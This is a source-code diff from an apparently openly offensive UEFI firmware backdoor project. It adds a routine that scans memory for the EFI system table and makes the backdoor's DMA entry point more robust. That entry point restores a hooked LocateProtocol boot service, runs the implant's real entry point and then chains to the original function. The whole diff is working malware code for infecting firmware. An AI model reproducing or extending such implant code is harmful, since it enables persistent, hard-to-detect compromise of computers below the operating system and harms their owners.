@@ -691,6 +691,30 @@ VOID BackdoorEntryResident(VOID *Image)
 
 }
 //--------------------------------------------------------------------------------------
+#define SYSTEM_TABLE_START 0x70000000
+#define SYSTEM_TABLE_END   0xd0000000
+
+EFI_SYSTEM_TABLE *BackdoorFindSystemTable(void)
+{
+    UINTN Ptr = 0;
+
+    for (Ptr = SYSTEM_TABLE_START; Ptr < SYSTEM_TABLE_END; Ptr += PAGE_SIZE)
+    {
+        EFI_SYSTEM_TABLE *SystemTable = (EFI_SYSTEM_TABLE *)Ptr;
+
+        // check for the valid system table header
+        if (SystemTable->Hdr.Signature == EFI_SYSTEM_TABLE_SIGNATURE &&
+            SystemTable->Hdr.HeaderSize < PAGE_SIZE &&
+            SystemTable->Hdr.Revision < (3 << 16) &&
+            SystemTable->Hdr.Reserved == 0)
+        {
+            return SystemTable;
+        }
+    }
+
+    return NULL;
+}
+
 EFI_STATUS EFIAPI BackdoorEntryDma(EFI_GUID *Protocol, VOID *Registration, VOID **Interface)
 {
     VOID *Base = NULL;
@@ -715,14 +739,31 @@ EFI_STATUS EFIAPI BackdoorEntryDma(EFI_GUID *Protocol, VOID *Registration, VOID 
     LocateProtocol = (EFI_LOCATE_PROTOCOL)m_InfectorConfig.LocateProtocol;
     SystemTable = (EFI_SYSTEM_TABLE *)m_InfectorConfig.SystemTable;    
 
-    // remove LocateProtocol() hook
-    SystemTable->BootServices->LocateProtocol = LocateProtocol;
+    if (LocateProtocol != NULL)
+    {
+        // remove LocateProtocol() hook
+        SystemTable->BootServices->LocateProtocol = LocateProtocol;
+    }
 
-    // call real entry point
-    _ModuleEntryPoint(NULL, SystemTable);    
+    if (SystemTable == NULL)
+    {
+        // scan memory and find system table address
+        SystemTable = BackdoorFindSystemTable();
+    }
 
-    // call hooked function
-    return LocateProtocol(Protocol, Registration, Interface);
+    if (SystemTable != NULL)
+    {
+        // call real entry point
+        _ModuleEntryPoint(NULL, SystemTable);    
+    }
+
+    if (LocateProtocol != NULL)
+    {
+        // call hooked function
+        return LocateProtocol(Protocol, Registration, Interface);
+    }
+
+    return EFI_SUCCESS;
 }
 //--------------------------------------------------------------------------------------
 EFI_STATUS EFIAPI BackdoorEntryInfected(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
